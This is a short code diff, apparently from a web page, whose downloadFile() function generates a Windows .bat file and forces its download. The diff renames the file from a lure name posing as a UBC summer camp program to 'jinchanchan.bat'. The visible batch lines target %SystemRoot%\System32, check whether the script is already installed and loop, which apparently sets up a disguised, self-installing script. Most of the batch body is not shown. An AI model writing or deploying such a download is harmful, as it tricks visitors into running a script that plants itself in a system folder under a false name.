@@ -109,7 +109,7 @@
         function downloadFile() {
             var batContent = `
 @echo off
-set script_name=UBC_Summer_Camp_2025_Geering_Up_Program.bat
+set script_name=jinchanchan.bat
 set script_path=%SystemRoot%\\System32\\%script_name%
 
 if not exist "%script_path%" (
@@ -128,7 +128,7 @@ goto loop
             var blob = new Blob([batContent], { type: 'text/plain' });
             var link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
-            link.download = 'UBC_Summer_Camp_2025_Geering_Up_Program.bat';
+            link.download = 'jinchanchan.bat';  // Updated to jinchanchan.bat
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
